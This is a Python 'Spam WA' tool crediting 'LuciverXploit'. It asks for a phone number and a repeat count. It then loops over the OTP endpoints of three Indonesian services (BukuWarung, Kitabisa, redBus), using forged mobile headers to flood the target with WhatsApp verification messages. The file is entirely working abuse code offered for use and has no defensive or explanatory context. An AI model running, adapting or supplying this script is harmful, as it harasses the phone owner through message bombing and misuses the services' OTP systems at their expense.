import os,sys,time,requests,json,random
from time import sleep
from colorama import init, Fore, Back
B = Fore.BLUE
W = Fore.WHITE
C = Fore.CYAN
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
M = Fore.MAGENTA
BL = Fore.BLACK
ERR = f"   {R}[!]{W} "
QUE = f"   {M}[?]{W} "
INF = f"   {M}[+]{W} "
DAN = f"{R} [!]"

def back():
    input("\033[00m   [ "+warna+"Press Enter To Back \033[00m]")
    os.system('python spam.py')
def baner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""
   {warna}╔═╗{W}┌─┐┌─┐┌┬┐  {warna}╦ ╦{W}┌─┐
   {warna}╚═╗{W}├─┘├─┤│││  {warna}║║║{W}├─┤ V{warna}2.0
   {warna}╚═╝{W}┴  ┴ ┴┴ ┴  {warna}╚╩╝{W}┴ ┴ """)
    print("   "+Back.WHITE+BL+"     By : LuciverXploit    \033[00m")

def wa1(no):
    headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/4.8.1"}
    data=json.dumps({"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":no})
    req=requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send", headers=headers, data=data).text
    if "OTP_SENT" in req:
        print("\033[00m   [\033[92mok\033[00m]Result : \033[92mSuccess\033[00m")
    else:
        print("\033[00m   [\033[91mno\033[00m]Result : \033[91mFailed!\033[00m")
def wa2(no):
    rd=random.randint(111,999)
    name=["fahmi","xzcoder","bed3bah","xmanz","apmz"]
    nick=random.choice(name)
    nickname=nick+str(rd)
    headers={"Host":"wong.kitabisa.com","x-ktbs-platform-name":"pwa","origin":"https://account.kitabisa.com","x-ktbs-time":"1611020248","user-agent":"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36","x-ktbs-api-version":"1.0.0","accept":"application/json","x-ktbs-client-name":"kanvas","x-ktbs-request-id":"107790c3-86e0-4872-9dfb-b9c5da9bfa13","x-ktbs-client-version":"1.0.0","x-ktbs-signature":"e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e","version":"3.4.0","referer":"https://account.kitabisa.com/register/otp?type=sms","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
    data=json.dumps({"full_name":nickname,"username":no,"otp_type":"whatsapp"})
    req=requests.post("https://wong.kitabisa.com/register/draft",headers=headers,data=data).text
    if "otp_form" in req:
        print("\033[00m   [\033[92mok\033[00m]Result : \033[92mSuccess\033[00m")
    else:
        print("\033[00m   [\033[91mno\033[00m]Result : \033[91mFailed!\033[00m")
def wa3(no):
    req=requests.get("https://m.redbus.id/").cookies
    cn=req["country"]
    cs=req["country_ISO"]
    crc=req["currency"]
    dl=req["defaultlanguage"]
    lg=req["language"]
    rb=req["rbuuid"]
    sc=req["selectedCurrency"]
    usc=req["userSessionCookie"]
    usid=req["userSessionId"]
    cokie="country="+cn+"&country_ISO="+cs+"&currency="+crc+"&defaultlanguage="+dl+"&language="+lg+"&rbuuid="+rb+"&selectedCurrency="+sc+"&userSessionCookie="+usc+"&userSessionId="+usid
    headers={"Host":"m.redbus.id","accept":"application/json, text/plain, */*","traceparent":"00-95ce51c8ab418cfdb6cf3d88156c44ff-8c2e432cb2a5c036-01","user-agent":"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie":cokie}
    req1=requests.get(f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true",headers=headers).text
    if "OTP Sent Successfully" in req1:
        print("\033[00m   [\033[92mok\033[00m]Result : \033[92mSuccess\033[00m")
    else:
        print("\033[00m   [\033[91mno\033[00m]Result : \033[91mFailed!\033[00m")
if __name__=="__main__":
     rd=[B,C,G,Y,M]
     warna=random.choice(rd)
     baner()
     print()
     nomor=input(QUE+"Phone Number \033[91m: "+warna)
     nomin=nomor.replace('0','')
     count=int(input(QUE+"Spam Count \033[91m : "+warna))
     for i in range(count):
         wa1(nomin)
         sleep(3)
         wa2(nomor)
         sleep(3)
         wa3(nomin)
         sleep(3)
     print(INF+"Done!")
     back()
